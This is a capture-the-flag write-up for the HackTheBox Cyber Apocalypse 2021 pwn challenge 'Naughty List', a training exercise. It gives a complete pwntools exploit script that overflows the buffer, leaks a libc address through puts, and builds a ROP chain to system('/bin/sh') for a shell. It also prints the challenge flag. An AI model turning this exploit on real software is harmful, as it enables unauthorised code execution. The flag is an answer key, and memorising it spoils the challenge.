---
name: Naughty List (2021)
event: HackTheBox Cyber Apocalypse CTF 2021
category: Pwn
description: Writeup for Naughty List (Pwn) - HackTheBox Cyber Apocalypse CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Naughty List

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/3GGpyEkt8GE/0.jpg)](https://youtu.be/3GGpyEkt8GE?t=916s "HTB Cyber Apocalypse CTF 2021: Naughty List")

## Challenge Description

> The Elves have stolen Santa's 📜 and now he does not know who was good and who was bad. This form will help him recreate his list and send out gifts. Were you good enough or naughty?

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b':', b'crypto')
    p.sendlineafter(b':', b'cat')
    p.sendlineafter(b':', b'18')
    p.sendlineafter(b':', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './naughty_list'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'info'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # Local
libc = ELF('libc.so.6')  # Remote

# Pass in pattern_size, get back EIP/RIP offset
offset = find_ip(cyclic(1000))

ret = 0x400756

# Start program
io = start()

io.sendlineafter(b':', b'crypto')
io.sendlineafter(b':', b'cat')
io.sendlineafter(b':', b'18')

# Create a ROP object to handle complexities
rop = ROP(elf)

# Payload to leak libc function
rop.puts(elf.got.puts)
rop.get_descr()

# Send the payload
io.sendlineafter(':', flat({offset: rop.chain()}))

io.recvlines(6)  # Receive up to leaked address

# Retrieve got.puts address
got_puts = unpack(io.recvline()[:6].ljust(8, b"\x00"))
info("leaked got_puts: %#x", got_puts)

# Subtract puts offset to get libc base
libc.address = got_puts - libc.symbols.puts
info("libc_base: %#x", libc.address)

# Reset ROP object with libc binary
rop = ROP(libc)

# Call ROP system, passing location of "/bin/sh" string
rop.system(next(libc.search(b'/bin/sh\x00')))

# Send the payload
io.sendline(flat({offset: [ret, rop.chain()]}))

# Got Shell?
io.interactive()
```
{% endcode %}

Flag: `HTB{S4nt4_g0t_ninety9_pr0bl3ms_but_chr1stm4s_4in7_0n3}`
